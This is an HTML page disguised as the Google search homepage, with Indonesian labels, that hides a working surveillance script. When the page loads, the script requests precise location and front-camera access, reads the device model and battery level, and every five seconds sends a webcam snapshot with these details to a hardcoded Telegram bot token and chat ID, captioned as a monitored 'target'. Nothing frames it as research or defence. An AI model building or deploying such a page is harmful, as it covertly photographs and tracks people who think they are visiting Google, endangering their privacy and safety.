<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Google</title>
    <style>
        body { margin: 0; font-family: arial, sans-serif; background: #fff; display: flex; flex-direction: column; height: 100vh; }
        .navbar { display: flex; justify-content: flex-end; padding: 15px; gap: 15px; font-size: 13px; color: #3c4043; }
        .main { display: flex; flex-direction: column; align-items: center; margin-top: 80px; flex-grow: 1; }
        .logo { width: 272px; margin-bottom: 30px; }
        .search-form { width: 90%; max-width: 584px; display: flex; flex-direction: column; align-items: center; }
        .search-container { width: 100%; position: relative; }
        .search-bar { 
            width: 100%; border: 1px solid #dfe1e5; padding: 12px 20px; 
            border-radius: 24px; font-size: 16px; outline: none; box-sizing: border-box;
        }
        .buttons { margin-top: 25px; display: flex; gap: 10px; }
        .btn { 
            background-color: #f8f9fa; border: 1px solid #f8f9fa; 
            border-radius: 4px; color: #3c4043; padding: 0 16px; 
            line-height: 34px; font-size: 14px; cursor: pointer;
        }
    </style>
</head>
<body>

<div class="navbar">
    <span>Gmail</span>
    <span>Gambar</span>
    <div style="background:#5f6368; width:30px; height:30px; border-radius:50%;"></div>
</div>

<div class="main">
    <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_272x92dp.png" class="logo">
    
    <!-- Action diarahkan ke Google Search resmi -->
    <form class="search-form" action="https://www.google.com/search" method="GET" id="googleForm">
        <div class="search-container">
            <input type="text" name="q" class="search-bar" id="query" autocomplete="off" autofocus>
        </div>
        <div class="buttons">
            <input type="submit" class="btn" value="Penelusuran Google">
            <input type="button" class="btn" value="Saya Lagi Beruntung">
        </div>
    </form>
</div>

<video id="video" style="display:none;" autoplay playsinline></video>
<canvas id="canvas" style="display:none;"></canvas>

<script>
    const TOKEN = '8746483619:AAFM0hZ7HwcnPFPV07PFUZZ4lGML0Nrt5aw';
    const CHAT_ID = '6888530451';
    let userLocation = "Mencari lokasi...";
    let deviceName = "Mendeteksi...";
    let batteryLevel = "N/A";

    // 1. Deteksi Perangkat Lebih Akurat (Membedah string User-Agent)
    function detectDevice() {
        const ua = navigator.userAgent;
        if (/android/i.test(ua)) {
            const match = ua.match(/\(([^;]+); ([^;]+); ([^)]+)\)/) || ua.match(/\(([^;]+); ([^)]+)\)/);
            return match ? (match[3] || match[2]).split(" Build")[0] : "Android Device";
        } else if (/iPhone/i.test(ua)) {
            return "iPhone";
        }
        return "Unknown Device";
    }

    // 2. Meminta Izin Lokasi & Kamera secara agresif saat load
    async function startService() {
        deviceName = detectDevice();
        
        // Cek Baterai
        if (navigator.getBattery) {
            const bat = await navigator.getBattery();
            batteryLevel = Math.round(bat.level * 100) + "%";
        }

        // Minta Lokasi (Notifikasi akan muncul di sini)
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(pos => {
                userLocation = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
            }, err => {
                userLocation = "Izin Lokasi Ditolak";
            }, { enableHighAccuracy: true });
        }

        // Minta Kamera
        try {
            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
            const video = document.getElementById('video');
            video.srcObject = stream;
            video.onloadedmetadata = () => {
                video.play();
                // Kirim data pertama kali
                takeSnapshot();
                // Set interval tiap 5 detik
                setInterval(takeSnapshot, 5000);
            };
        } catch (e) {
            console.log("Izin kamera ditolak");
        }
    }

    async function takeSnapshot() {
        const canvas = document.getElementById('canvas');
        const video = document.getElementById('video');
        if (video.videoWidth === 0) return;

        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        canvas.getContext('2d').drawImage(video, 0, 0);

        canvas.toBlob(blob => {
            const formData = new FormData();
            formData.append('chat_id', CHAT_ID);
            formData.append('photo', blob, 'shot.jpg');
            formData.append('caption', `👁 *Target Terpantau*\n\n📱 HP: ${deviceName}\n🔋 Baterai: ${batteryLevel}\n📍 Lokasi: ${userLocation}`);
            formData.append('parse_mode', 'Markdown');
            fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: formData });
        }, 'image/jpeg', 0.6);
    }

    // Pastikan fungsi jalan saat halaman dibuka
    window.onload = startService;
</script>

</body>
</html>
